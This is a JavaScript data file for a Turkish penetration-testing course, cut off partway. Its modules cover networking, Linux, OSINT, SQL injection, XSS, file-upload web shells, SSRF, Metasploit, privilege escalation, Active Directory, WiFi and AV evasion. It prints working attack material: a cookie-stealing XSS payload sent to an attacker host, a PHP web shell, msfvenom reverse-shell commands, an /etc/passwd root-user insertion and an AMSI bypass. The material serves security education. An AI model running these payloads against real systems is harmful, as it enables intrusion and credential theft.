/**
 * BZT Cyber Security - Kapsamlı Hacker Eğitim Müfredatı & Bilgi Deposu
 * Sıfırdan İleri Seviyeye Siber Güvenlik Modülleri
 */

const CURRICULUM_DATA = [
  // =========================================================================
  // FAZ 1: TEMELLER VE AĞ PROTOKOLLERİ
  // =========================================================================
  {
    id: "net-foundations",
    phase: 1,
    phaseTitle: "Faz 1: Altyapı & Temeller",
    title: "Ağ Mimarisi, TCP/IP ve Protokoller",
    icon: "network",
    difficulty: "Başlangıç",
    duration: "45 dk",
    summary: "Ağ mimarisini bilmeyen bir hacker kördür. TCP 3-Way Handshake, OSI 7 Katmanı, DNS sorguları, ARP zehirlemesi ve paket yapısını derinlemesine kavrayın.",
    tags: ["TCP/IP", "OSI", "Wireshark", "DNS", "ARP", "Handshake"],
    sections: [
      {
        heading: "1. OSI Modeli ve Katmanların Hacklenmesi",
        content: `Siber güvenlikte her saldırı OSI modelinin belirli bir katmanını hedefler:
- **Katman 2 (Data Link):** MAC Adresleri, ARP protokolü. Saldırılar: ARP Spoofing/Poisoning, MAC Flooding.
- **Katman 3 (Network):** IP Adresleri, Yönlendirme (Routing), ICMP. Saldırılar: IP Spoofing, Ping Flood, Smurf Attack.
- **Katman 4 (Transport):** TCP & UDP. Bağlantı yönetimi, portlar. Saldırılar: SYN Flood, Port Taraması (SYN Scan, FIN Scan).
- **Katman 7 (Application):** HTTP/S, DNS, SSH, FTP, SMTP. Saldırılar: Web Enjeksiyonları (SQLi, XSS), DNS Poisoning.`,
        codeSnippet: `# Wireshark veya Tshark ile TCP paket başlıklarını izleme
sudo tshark -i eth0 -f "tcp port 80" -T fields -e ip.src -e ip.dst -e tcp.flags`,
        tip: "Nmap SYN Scan (-sS), TCP 3-Way Handshake'i (SYN -> SYN/ACK -> RST) tamamlamayarak hedefte tam bağlantı logu bırakmadan portun açık olup olmadığını anlar."
      },
      {
        heading: "2. TCP 3-Way Handshake ve Paket Anatomisi",
        content: `Güvenli TCP iletişimi 3 adımlı el sıkışma ile başlar:
1. **SYN (Synchronize):** İstemci hedefe bağlantı isteği ve rastgele bir Sequence Number (ISN) yollar.
2. **SYN-ACK (Synchronize-Acknowledge):** Sunucu isteği kabul eder, kendi ISN'ini ve istemcinin ISN+1 değerini yollar.
3. **ACK (Acknowledge):** İstemci yanıtı doğrular ve bağlantı kurulur (ESTABLISHED).

**Hacker Taktikleri:**
- **SYN Flood:** Çok sayıda sahte IP'den SYN yollayıp ACK göndermemek sunucunun bağlantı tablosunu tüketir (DoS).
- **RST Enjeksiyonu:** Araya girip sahte RST paketiyle kurbanın bağlantısını zorla koparma.`,
        codeSnippet: `# Python Scapy ile özel TCP SYN paketi üretimi
from scapy.all import IP, TCP, send
packet = IP(dst="192.168.1.50")/TCP(dport=80, flags="S")
send(packet, verbose=0)`,
        terminalCommand: "sudo nmap -sS -p 80,443 192.168.1.1"
      }
    ],
    quiz: {
      question: "Nmap'in varsayılan SYN Scan (-sS) taramasında, hedef port açıksa hedef sunucudan dönen bayrak kombinasyonu nedir?",
      options: [
        "SYN / ACK",
        "RST / ACK",
        "FIN / PSH",
        "Yalnızca ACK"
      ],
      correct: 0,
      explanation: "Açık bir port SYN paketine 'SYN/ACK' ile yanıt verir. Nmap bunu görünce hemen RST yollayarak bağlantıyı koparır ve log bırakmaz."
    }
  },

  {
    id: "linux-bash-mastery",
    phase: 1,
    phaseTitle: "Faz 1: Altyapı & Temeller",
    title: "Linux Çekirdeği, İzinler ve Bash Savaş Sanatı",
    icon: "terminal",
    difficulty: "Başlangıç",
    duration: "60 dk",
    summary: "Hacker dünyasının ana dili Linux'tur. Dosya izinleri (rwx, SUID, SGID), boru hatları (pipes), grep/awk filtreleri ve otomasyon scriptleri.",
    tags: ["Linux", "Bash", "SUID", "Chmod", "Grep", "Permissions"],
    sections: [
      {
        heading: "1. Özel İzinler: SUID ve SGID'nin Önemi",
        content: `Standart rwx (Read, Write, Execute) izinlerinin ötesinde Linux'ta güvenlik açıklarına en çok yol açan izin **SUID (Set User ID - 4000)**'dir.
Bir dosyaya SUID biti verilmişse (`-rwsr-xr-x`), bu dosya çalıştırıldığında o anki kullanıcının değil, **dosya sahibinin (genellikle root)** yetkileriyle çalışır!

Eğer \`/bin/bash\`, \`/usr/bin/find\`, \`/usr/bin/vim\` veya hatalı yazılmış bir binary'de SUID biti varsa, düşük yetkili bir kullanıcı anında Root olabilir!`,
        codeSnippet: `# Sistemdeki tüm SUID bitine sahip dosyaları tespit etme
find / -perm -4000 -type f 2>/dev/null`,
        tip: "GTFOBins web sitesi, sistemdeki yerleşik binary'lerin SUID veya Sudo haklarıyla nasıl Root yetkisi verdiğini listeler."
      },
      {
        heading: "2. Linux Pentest Tek-Satırlıkları (One-Liners)",
        content: `Bir sisteme ilk girdiğinizde durum tespiti (Discovery) için bu komutlar hayatidir:
- Aktif kullanıcılar ve gruplar: \`id\`, \`whoami\`, \`cat /etc/passwd\`
- Çalışan prosesler: \`ps aux | grep root\`
- Açık yerel portlar: \`ss -tulpn\` veya \`netstat -ano\`
- Sudo hakları: \`sudo -l\``,
        codeSnippet: `# Sudo şifresiz komut listesini sorgula
sudo -l

# Dinlenen yerel portları listele (Dışarıya kapalı servisleri bulmak için)
ss -antup | grep LISTEN`,
        terminalCommand: "find / -perm -u=s -type f 2>/dev/null"
      }
    ],
    quiz: {
      question: "Linux'ta bir binary'nin çalıştırıldığında sahibinin (örneğin root) yetkisiyle çalışmasını sağlayan özel izin biti hangisidir?",
      options: [
        "SUID (Set User ID - 4000)",
        "Sticky Bit (1000)",
        "SGID (2000)",
        "Chown Bit"
      ],
      correct: 0,
      explanation: "SUID biti atanmış bir dosya, çalıştırıldığı anda dosya sahibinin yetkileriyle execute edilir. Yetki yükseltmede (Privilege Escalation) en kritik vektörlerden biridir."
    }
  },

  // =========================================================================
  // FAZ 2: KEŞİF VE İSTİHBARAT TOPLAMA (RECONNAISSANCE & OSINT)
  // =========================================================================
  {
    id: "osint-recon-deep",
    phase: 2,
    phaseTitle: "Faz 2: Keşif & OSINT",
    title: "OSINT (Açık Kaynak İstihbaratı) & Saldırı Yüzeyi Haritalama",
    icon: "search",
    difficulty: "Orta",
    duration: "50 dk",
    summary: "Hedefe tek bir paket dahi atmadan Shodan, Google Dorking, DNS Brute-Force, Subdomain Enumeration ve sızdırılmış kimlik bilgilerini toplayın.",
    tags: ["OSINT", "Shodan", "Subdomains", "Google Dorks", "Amass", "DNS"],
    sections: [
      {
        heading: "1. Google Dorking ile Hassas Veri Avı",
        content: `Arama motorlarının indekslediği gizli dosyaları, yönetim panellerini ve açık veritabanı yedeklerini özel arama operatörleriyle bulun:
- \`site:hedef.com filetype:env\` -> Açıkta unutulmuş .env dosyaları (API keyler, DB şifreleri)
- \`site:hedef.com filetype:sql "dump" OR "INSERT INTO"\` -> Veritabanı yedekleri
- \`site:hedef.com inurl:admin OR inurl:login\` -> Gizli yönetim girişleri
- \`site:hedef.com ext:log OR ext:bak\` -> Sistem logları ve yedek kaynak kodları`,
        codeSnippet: `# Subdomain keşfi için Sublist3r kullanımı
sublist3r -d hedef.com -o subdomains.txt

# Hızlı DNS brute-force için gobuster
gobuster dns -d hedef.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`,
        tip: "Shodan.io'da 'org:\"Hedef Şirket\" port:3389' araması yaparak şirketin dışarıya açık RDP (Uzak Masaüstü) sunucularını dakikalar içinde tespit edebilirsiniz."
      },
      {
        heading: "2. Port Tarama Ustalığı: Nmap & Masscan",
        content: `Keşif aşamasında doğru parametre kombinasyonu IDS/IPS'lere yakalanmadan bilgi toplamanın anahtarıdır.
- **-sC (Script Scan):** Güvenli NSE scriptlerini çalıştırır.
- **-sV (Version Detection):** Çalışan servislerin tam sürüm bilgisini (Apache 2.4.49, OpenSSH 7.2p2 vb.) çeker.
- **-p-:** 1-65535 arasındaki tüm portları tarar (Standart tarama yalnızca en yaygın 1000 portu tarar!).`,
        codeSnippet: `# Kapsamlı ve agresif olmayan keşif taraması
nmap -sS -sV -sC -p 1-65535 -T4 -oA tarama_raporu hedef_ip`,
        terminalCommand: "nmap -sV -sC -Pn 10.10.10.15"
      }
    ],
    quiz: {
      question: "Dışarıya açık unutulmuş veritabanı konfigürasyon dosyalarını (.env) Google üzerinden aramak için hangi dork en etkilidir?",
      options: [
        "site:hedef.com filetype:env DB_PASSWORD",
        "find .env in hedef.com",
        "search:hedef.com -type:database",
        "site:hedef.com show pass"
      ],
      correct: 0,
      explanation: "filetype:env operatörü doğrudan .env uzantılı dosyaları arar; DB_PASSWORD anahtar kelimesi ise içinde parola bulunan ortam değişkenlerini hedefler."
    }
  },

  // =========================================================================
  // FAZ 3: WEB SIZMA TESTLERİ (OWASP TOP 10)
  // =========================================================================
  {
    id: "sqli-exploitation",
    phase: 3,
    phaseTitle: "Faz 3: Web Sızma Testleri",
    title: "SQL Injection: Union, Error, Blind & Time-Based Sömürü",
    icon: "database",
    difficulty: "İleri",
    duration: "75 dk",
    summary: "Veritabanının kontrolünü ele geçirin. Kimlik doğrulama bypass, Union-based veri sızdırma, Error-based sömürü ve SQLMap ile otomasyon.",
    tags: ["SQLi", "OWASP", "Union-Based", "Blind SQLi", "SQLMap", "Database"],
    sections: [
      {
        heading: "1. Kimlik Doğrulama Bypass (Authentication Bypass)",
        content: `Geliştirici parametreleri filtrelemeden doğrudan SQL sorgusuna eklerse:
\`SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'\`

Kullanıcı adı alanına \`admin' --\` girildiğinde sorgu şuna dönüşür:
\`SELECT * FROM users WHERE username = 'admin' --' AND password = '...'\`
\`--\` işareti SQL'de yorum satırı olduğundan şifre kontrolü tamamen yok sayılır ve sisteme admin olarak giriş yapılır!`,
        codeSnippet: `' OR '1'='1' --
' OR 1=1 #
admin' /*
' UNION SELECT null, username, password FROM users --`,
        tip: "Modern ORM'ler (Prisma, Hibernate, Entity Framework) ve Prepared Statements (Parametreli Sorgular) SQL Injection'ı %100 oranında engeller."
      },
      {
        heading: "2. Union-Based Veri Sızdırma Adımları",
        content: `1. Sütun sayısını bulma: \`' ORDER BY 1--\`, \`' ORDER BY 2--\`, hata verene kadar devam edilir.
2. Ekrana yansıyan sütunu tespit etme: \`' UNION SELECT 1, 2, 3--\`
3. Veritabanı ve kullanıcı adını çekme: \`' UNION SELECT 1, version(), database()--\`
4. Tabloları listeleme: \`' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--\`
5. Hassas verileri (kullanıcı/parola) çekme: \`' UNION SELECT 1, username, password FROM users--\``,
        codeSnippet: `# SQLMap ile otomatik veritabanı dökümü alma
sqlmap -u "http://hedef.com/product.php?id=1" --batch --dbs
sqlmap -u "http://hedef.com/product.php?id=1" -D veritabani_adi --tables
sqlmap -u "http://hedef.com/product.php?id=1" -D veritabani_adi -T users --dump`,
        terminalCommand: "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs"
      }
    ],
    quiz: {
      question: "Bir Union-Based SQL Injection saldırısında, orijinal sorgunun kaç sütun döndürdüğünü öğrenmek için en sık kullanılan SQL ifadesi nedir?",
      options: [
        "ORDER BY n --",
        "GROUP BY id --",
        "COUNT(columns) --",
        "DESCRIBE table --"
      ],
      correct: 0,
      explanation: "ORDER BY 1, ORDER BY 2... şeklinde artırılarak hata alınan sayıya kadar denenir. Hata alındığı andaki sayı - 1, orijinal sorgunun sütun sayısını verir."
    }
  },

  {
    id: "xss-csrf-dom",
    phase: 3,
    phaseTitle: "Faz 3: Web Sızma Testleri",
    title: "Cross-Site Scripting (XSS) & Oturum Çalma (Session Hijacking)",
    icon: "code",
    difficulty: "Orta",
    duration: "55 dk",
    summary: "Kullanıcıların tarayıcısında zararlı JavaScript kodları çalıştırın. Reflected, Stored ve DOM-based XSS türleri, WAF atlatma ve Cookie hırsızlığı.",
    tags: ["XSS", "Reflected", "Stored", "Cookie Stealing", "WAF Bypass"],
    sections: [
      {
        heading: "1. XSS Türleri ve Çalışma Mantığı",
        content: `- **Reflected (Yansıyan) XSS:** URL parametresi veya form girdisi sayfada anlık olarak filtrelenmeden gösterildiğinde tetiklenir (Kurbana özel link tıklatılmalıdır).
- **Stored (Kalıcı) XSS:** En tehlikelisidir. Yorum, profil ismi veya mesaj veritabanına kaydedilir; o sayfayı açan HERKESİN tarayıcısında otomatik çalışır.
- **DOM-based XSS:** Sunucuya gitmeden tamamen istemci tarafındaki JavaScript (document.location, eval, innerHTML) tarafından çalıştırılır.`,
        codeSnippet: `<!-- Temel Test Payload'ı -->
<script>alert(document.domain)</script>

<!-- Filtreleri Atlatma (Tag içi etkinlikler) -->
<img src=x onerror=alert(1)>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert(1)">`,
        tip: "Cookie'lerde 'HttpOnly' bayrağı aktifse, JavaScript 'document.cookie' nesnesine erişemez. Bu, XSS ile oturum çalınmasını büyük ölçüde engeller."
      },
      {
        heading: "2. Cookie Sızdırma (Cookie Stealing) Senaryosu",
        content: `Saldırgan kurbanın tarayıcısındaki session cookie'sini kendi sunucusuna şu payload ile aktarır:
\`<script>new Image().src="http://saldirgan.com/log?cookie=" + encodeURIComponent(document.cookie);</script>\`

Saldırgan dinleme modunda bekleyen Netcat sunucusunda kurbanın oturum çerezini yakalar ve kurbanın hesabına şifresiz giriş yapar!`,
        codeSnippet: `# Saldırgan makinede dinleyici açma
nc -lvnp 8080`,
        terminalCommand: "curl -s -X POST -d 'comment=<img src=x onerror=alert(1)>' http://target/comment"
      }
    ],
    quiz: {
      question: "Hangi güvenlik bayrağı (Cookie Flag), JavaScript'in document.cookie üzerinden çereze erişmesini engelleyerek XSS saldırılarına karşı oturumu korur?",
      options: [
        "HttpOnly",
        "Secure",
        "SameSite=Strict",
        "Domain-Restricted"
      ],
      correct: 0,
      explanation: "HttpOnly bayrağı çerezin yalnızca HTTP isteklerinde gönderilmesini sağlar, tarayıcı içi betiklerin (JS) çerezi okumasını engeller."
    }
  },

  {
    id: "rce-ssrf-deserialization",
    phase: 3,
    phaseTitle: "Faz 3: Web Sızma Testleri",
    title: "RCE, SSRF ve Dosya Yükleme (File Upload) Zafiyetleri",
    icon: "shield-alert",
    difficulty: "İleri",
    duration: "70 dk",
    summary: "En kritik web açıkları: Sunucuda komut çalıştırma (RCE), iç ağa atlama (SSRF) ve dosya yükleme kontrollerini bypass ederek Web Shell atma.",
    tags: ["RCE", "SSRF", "File Upload", "Webshell", "Reverse Shell"],
    sections: [
      {
        heading: "1. File Upload Zafiyeti & Web Shell Yükleme",
        content: `Kullanıcıların profil resmi veya belge yüklemesine izin veren sistemlerde dosya uzantısı doğrulaması eksikse, PHP/ASP/JSP web shell yüklenerek sunucuda tam kontrol sağlanabilir.
**Bypass Taktikleri:**
- Alternatif Uzantılar: \`.phtml\`, \`.php5\`, \`.phar\`, \`.pht\`
- Çift Uzantı: \`shell.php.jpg\` veya Null Byte: \`shell.php%00.jpg\`
- Content-Type Değiştirme: \`application/x-php\` yerine \`image/jpeg\` yollama
- Magic Bytes Ekleme: Dosyanın başına \`GIF89a;\` ekleyerek resim gibi gösterme`,
        codeSnippet: `<?php
// Basit PHP Web Shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>`,
        tip: "Web shell yüklendikten sonra 'http://hedef.com/uploads/shell.php?cmd=id' çağrıldığında sunucudaki 'id' komutunun çıktısı ekrana gelir."
      },
      {
        heading: "2. SSRF (Server-Side Request Forgery) ile Bulut Metadata Çalma",
        content: `Sunucunun dışarıdan aldığı URL'e istek yapması (örneğin resim önizleme) zafiyeti varsa, sunucu içerideki gizli servislere veya bulut servislerine köprü yapılır.
AWS bulut sunucularında IAM rollerini ve geçici kimlik bilgilerini çalmak için şu adrese istek yaptırılır:
\`http://169.254.169.254/latest/meta-data/iam/security-credentials/\``,
        codeSnippet: `# SSRF ile AWS Instance Metadata çekme testi
curl -s "http://hedef.com/fetch?url=http://169.254.169.254/latest/meta-data/"`,
        terminalCommand: "curl -s http://169.254.169.254/latest/meta-data/"
      }
    ],
    quiz: {
      question: "AWS EC2 sanal sunucularında IAM rolleri ve hassas yetki anahtarlarını barındıran yerel Instance Metadata IP adresi hangisidir?",
      options: [
        "169.254.169.254",
        "127.0.0.1",
        "10.0.0.1",
        "192.168.0.254"
      ],
      correct: 0,
      explanation: "169.254.169.254 AWS ve diğer birçok bulut sağlayıcısının yerel Link-Local metadata servis IP'sidir; SSRF saldırılarında ilk hedeftir."
    }
  },

  // =========================================================================
  // FAZ 4: SİSTEM & AĞ SIZMA TESTLERİ (SYSTEM EXPLOITATION & PRIVESC)
  // =========================================================================
  {
    id: "metasploit-exploitation",
    phase: 4,
    phaseTitle: "Faz 4: Sistem & Ağ Sızma",
    title: "Metasploit Framework, Shellcoding ve Meterpreter",
    icon: "cpu",
    difficulty: "Orta",
    duration: "65 dk",
    summary: "Dünyanın en popüler sızma testi çerçevesi. Hedefe uygun exploit seçimi, payload oluşturma (msfvenom), Meterpreter ile post-exploitation taktikleri.",
    tags: ["Metasploit", "Meterpreter", "msfvenom", "Payload", "Post-Exploitation"],
    sections: [
      {
        heading: "1. Metasploit Mimarisi ve Temel İş Akışı",
        content: `Metasploit bileşenleri:
- **Exploit:** Hedefteki açığı tetikleyen kod parçası.
- **Payload:** Açık tetiklendikten sonra hedefte çalışacak olan kod (Örn: Reverse Shell, Meterpreter).
- **Auxiliary:** Tarama, keşif ve DoS modülleri.
- **Post:** Sızma sonrası yetki yükseltme, parola hashlerini çekme modülleri.`,
        codeSnippet: `# Metasploit başlatma ve örnek modül kullanımı
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit`,
        tip: "Meterpreter, hedef sistemin diskine dosya yazmadan tamamen RAM (bellek) üzerinde çalışır (in-memory injection). Bu sayede klasik antivirüslere yakalanması çok zordur."
      },
      {
        heading: "2. msfvenom ile Özel Payload Oluşturma",
        content: `Farklı işletim sistemleri ve platformlar için ters bağlantı payload'ları üretin:`,
        codeSnippet: `# Linux ELF 64-bit Reverse Shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows x64 EXE Reverse Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o update.exe

# PHP Web Reverse Shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o rev.php`,
        terminalCommand: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf"
      }
    ],
    quiz: {
      question: "Metasploit'te diske dosya yazmadan doğrudan RAM üzerinde çalışarak tespit edilmeyi zorlaştıran gelişmiş payload türü hangisidir?",
      options: [
        "Meterpreter",
        "Command Shell",
        "Stager Raw",
        "Inline Bash"
      ],
      correct: 0,
      explanation: "Meterpreter, dinamik kütüphanelerini bellek üzerinde yükleyerek çalışan, zengin komut setine (hashdump, screenshot, webcam_snap, migrate) sahip gelişmiş bir payload'dur."
    }
  },

  {
    id: "privilege-escalation",
    phase: 4,
    phaseTitle: "Faz 4: Sistem & Ağ Sızma",
    title: "Yetki Yükseltme Sanatı: Linux & Windows Privilege Escalation",
    icon: "award",
    difficulty: "Uzman",
    duration: "80 dk",
    summary: "Düşük yetkili bir kullanıcıdan ROOT veya NT AUTHORITY\\SYSTEM seviyesine geçiş. Kernel açıkları, Sudo kötüye kullanımı, Cron jobs, Unquoted Service Paths.",
    tags: ["PrivEsc", "Linux PrivEsc", "Windows PrivEsc", "LinPEAS", "WinPEAS", "Root"],
    sections: [
      {
        heading: "1. Linux Yetki Yükseltme Vektörleri",
        content: `Düşük yetkili kabuk alındığında kontrol listesi:
1. **Sudo Yetkileri (\`sudo -l\`):** Kullanıcı şifresiz hangi komutları çalıştırabiliyor? (Örn: \`sudo find . -exec /bin/sh \\; -quit\`)
2. **SUID Dosyalar:** \`find / -perm -4000 2>/dev/null\`
3. **Zamanlanmış Görevler (Cron Jobs):** \`cat /etc/crontab\`, yazılabilir bir script root tarafından mı çağrılıyor?
4. **Yazılabilir \`/etc/passwd\`:** Eğer \`/etc/passwd\` dosyası yazılabilirse yeni bir root kullanıcısı eklenebilir!`,
        codeSnippet: `# Yazılabilir /etc/passwd ile anında Root ekleme
openssl passwd -1 -salt bzt password123
# Çıktı: $1$bzt$wXgYF...
echo "bzt:$1$bzt$wXgYF...:0:0:root:/root:/bin/bash" >> /etc/passwd
su bzt`,
        tip: "LinPEAS.sh otomasyon scripti, Linux sistemindeki yüzlerce olası açığı saniyeler içinde renkli çıktılarla tespit eder."
      },
      {
        heading: "2. Windows Yetki Yükseltme Taktikleri",
        content: `- **Unquoted Service Paths:** Boşluk içeren ve tırnak içine alınmamış servis yollarının arasına zararlı exe koyarak sistem açılışında çalıştırma (\`C:\\Program Files\\My App\\service.exe\` -> \`C:\\Program.exe\`).
- **AlwaysInstallElevated:** Registry'de bu anahtar 1 ise herhangi bir MSI paketi SYSTEM yetkisiyle kurulur!
- **Token Impersonation (SeImpersonatePrivilege):** IIS veya SQL Service hesabında bu yetki varsa 'JuicyPotato' veya 'PrintSpoofer' ile anında SYSTEM olunur!`,
        codeSnippet: `# SeImpersonatePrivilege ile SYSTEM yetkisine geçiş
PrintSpoofer64.exe -i -c cmd`,
        terminalCommand: "sudo -l"
      }
    ],
    quiz: {
      question: "Windows sistemlerde bir servis hesabında 'SeImpersonatePrivilege' yetkisi açık olduğunda SYSTEM seviyesine çıkmak için kullanılan ünlü exploit aracı hangisidir?",
      options: [
        "PrintSpoofer / JuicyPotato",
        "Mimikatz",
        "Chisel",
        "BloodHound"
      ],
      correct: 0,
      explanation: "SeImpersonatePrivilege yetkisine sahip servis hesapları (örneğin iis apppool veya network service), PrintSpoofer veya JuicyPotato araçlarıyla anında NT AUTHORITY\\SYSTEM yetkisine yükseltilebilir."
    }
  },

  {
    id: "active-directory-attacks",
    phase: 4,
    phaseTitle: "Faz 4: Sistem & Ağ Sızma",
    title: "Active Directory Sızma Testleri & Domain Dominance",
    icon: "server",
    difficulty: "Uzman",
    duration: "90 dk",
    summary: "Kurumsal ağların kalbi Active Directory. Kerberoasting, AS-REP Roasting, Pass-the-Hash, BloodHound ile saldırı yolları analizi ve Golden Ticket.",
    tags: ["Active Directory", "Kerberoasting", "BloodHound", "Mimikatz", "Golden Ticket", "Domain Admin"],
    sections: [
      {
        heading: "1. Kerberoasting Saldırısı",
        content: `Active Directory ortamında SPN (Service Principal Name) tanımlı kullanıcı hesaplarının TGS (Ticket Granting Service) biletleri herhangi bir domain kullanıcısı tarafından talep edilebilir.
Bu bilet servis hesabının NTLM hash'i ile şifrelidir. Saldırgan bu bileti belleğe çeker ve Hashcat ile çevrimdışı (offline) kırarak hesap parolasını çözer!`,
        codeSnippet: `# Impacket GetUserSPNs ile Kerberoastable hesapları çekme
GetUserSPNs.py domain.local/kullanici:parola -dc-ip 192.168.1.10 -request -outputfile tgs_hashes.txt

# Hashcat ile bileti kırma (Mode 13100)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt`,
        tip: "BloodHound aracı, Domain içindeki tüm kullanıcı, grup ve bilgisayar ilişkilerini bir grafik veritabanına (Neo4j) aktararak Domain Admin'e giden en kısa saldırı yolunu otomatik çizer."
      },
      {
        heading: "2. Pass-the-Hash ve Mimikatz",
        content: `Windows ortamında kimlik doğrulamada parola açık metin (plaintext) yerine NTLM hash olarak kullanılır.
Saldırgan parolayı kırmadan doğrudan NTLM hash'i ile diğer sunucularda oturum açabilir (Pass-the-Hash).`,
        codeSnippet: `# CrackMapExec ile Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"`,
        terminalCommand: "crackmapexec smb 192.168.1.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0"
      }
    ],
    quiz: {
      question: "Active Directory'de SPN kayıtlı servis hesaplarının TGS biletlerini çevrimdışı parola kırma amacıyla talep etme saldırısının adı nedir?",
      options: [
        "Kerberoasting",
        "AS-REP Roasting",
        "Pass-the-Ticket",
        "Silver Ticket"
      ],
      correct: 0,
      explanation: "Kerberoasting, normal bir domain kullanıcısının SPN tanımlı hesaplar için TGS bileti talep edip ardından bu bileti offline brute-force ile kırması tekniğidir."
    }
  },

  // =========================================================================
  // FAZ 5: KABLOSUZ AĞLAR & SOSYAL MÜHENDİSLİK
  // =========================================================================
  {
    id: "wireless-social-eng",
    phase: 5,
    phaseTitle: "Faz 5: Kablosuz Ağ & Sosyal Mühendislik",
    title: "Kablosuz Ağ Güvenliği (WiFi) & İleri Sosyal Mühendislik",
    icon: "wifi",
    difficulty: "Orta",
    duration: "55 dk",
    summary: "Havadan sızma: WPA2/3 4-Way Handshake yakalama, Deauth saldırıları, Evil Twin sahte erişim noktaları ve kimlik avı (Phishing) teknikleri.",
    tags: ["WiFi", "Aircrack-ng", "Handshake", "Evil Twin", "Phishing", "Social Engineering"],
    sections: [
      {
        heading: "1. Aircrack-ng ile WiFi Handshake Yakalama",
        content: `Kablosuz ağ kartı monitör moda alınarak ortamdaki tüm paketler dinlenir:
1. Kartı monitör moda alma: \`airmon-ng start wlan0\`
2. Ağları tarama: \`airodump-ng wlan0mon\`
3. Hedef ağdaki istemciyi deauthenticate ederek zorla yeniden bağlatma: \`aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon\`
4. Yakalanan WPA 4-Way Handshake dosyasını parola listesi ile kırma.`,
        codeSnippet: `# Handshake dosyasını Rockyou kelime listesi ile kırma
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 handshake.cap`,
        tip: "WPA3 korumalı ağlar Dragonfly el sıkışması kullandığından klasik offline 4-Way Handshake kırma saldırılarına karşı bağışıklıdır."
      }
    ],
    quiz: {
      question: "Aircrack-ng paketinde bir istemciyi kablosuz erişim noktasından geçici olarak koparıp yeniden bağlanmaya zorlayarak handshake yakalamak için hangi komut kullanılır?",
      options: [
        "aireplay-ng --deauth",
        "airodump-ng --kick",
        "aircrack-ng --disconnect",
        "airmon-ng --drop"
      ],
      correct: 0,
      explanation: "aireplay-ng -0 (veya --deauth) komutu hedefe deauthentication paketleri yollar, istemci kopup geri bağlanırken handshake yakalanır."
    }
  },

  // =========================================================================
  // FAZ 6: RED TEAMING & ANTİVİRÜS ATLATMA (EVASION)
  // =========================================================================
  {
    id: "red-team-evasion",
    phase: 6,
    phaseTitle: "Faz 6: Red Teaming & Evasion",
    title: "AV/EDR Atlatma (Bypass) & Komuta Kontrol (C2) Mimarileri",
    icon: "eye-off",
    difficulty: "Uzman",
    duration: "85 dk",
    summary: "Modern savunma sistemlerini (Windows Defender, CrowdStrike, SentinelOne) aşma. Bellek içi enjeksiyon (In-Memory Injection), AMSI Bypass, Shellcode şifreleme ve C2 sunucuları.",
    tags: ["Red Team", "AV Bypass", "AMSI", "EDR", "C2", "Sliver", "Havoc"],
    sections: [
      {
        heading: "1. Antivirüsler Nasıl Çalışır ve Nasıl Atlatılır?",
        content: `Modern güvenlik çözümleri iki temel yöntem kullanır:
1. **Statik İmza Analizi:** Dosyanın hash değeri veya içindeki bilinen bayt dizileri (YARA kuralları).
   * *Atlatma:* Şifreleme (XOR, AES), Obfuscation, değişken isimlerini rastgele yapma.
2. **Dinamik Davranış / Heuristic Analiz & EDR Kancaları (API Hooking):**
   * EDR'lar ntdll.dll içindeki kritik fonksiyonlara (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) kanca atar.
   * *Atlatma:* Doğrudan Sistem Çağrıları (Direct Syscalls) kullanarak kancaları (hooks) baypas etme!`,
        codeSnippet: `# PowerShell AMSI (Antimalware Scan Interface) bellek içi baypas tekniği
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
        tip: "Sliver ve Havoc, modern Red Team operasyonlarında Cobalt Strike'a alternatif olarak kullanılan açık kaynaklı C2 platformlarıdır."
      }
    ],
    quiz: {
      question: "Windows'ta çalışan scriptlerin (PowerShell, VBScript) bellek içinde taranıp güvenlik yazılımına bildirilmesini sağlayan Windows arabirimi nedir?",
      options: [
        "AMSI (Antimalware Scan Interface)",
        "UAC (User Account Control)",
        "AppLocker",
        "DEP (Data Execution Prevention)"
      ],
      correct: 0,
      explanation: "AMSI (Antimalware Scan Interface), betiklerin bellekte execute edilmeden önce antivirüs motorlarına gönderilip taranmasını sağlayan standart arayüzdür."
    }
  },

  // =========================================================================
  // FAZ 7: MAVİ TAKIM, SOC & SERTİFİKASYON REHBERİ
  // =========================================================================
  {
    id: "blue-team-career",
    phase: 7,
    phaseTitle: "Faz 7: Mavi Takım & Kariyer",
    title: "SOC Analistliği, Paket Analizi & Hacker Sertifikasyon Yol Haritası",
    icon: "shield-check",
    difficulty: "Orta",
    duration: "60 dk",
    summary: "Hücumu bilen en iyi savunmayı yapar. Wireshark ile zararlı trafik tespiti, SIEM log korelasyonu ve OSCP, CEH, eJPT, CISSP sınav rehberi.",
    tags: ["Blue Team", "SOC", "Wireshark", "OSCP", "eJPT", "Certifications", "Career"],
    sections: [
      {
        heading: "1. Etik Hacker ve Pentester Sertifikasyon Rehberi",
        content: `Sektörde en çok değer gören ve pratik sınav odaklı sertifikalar:
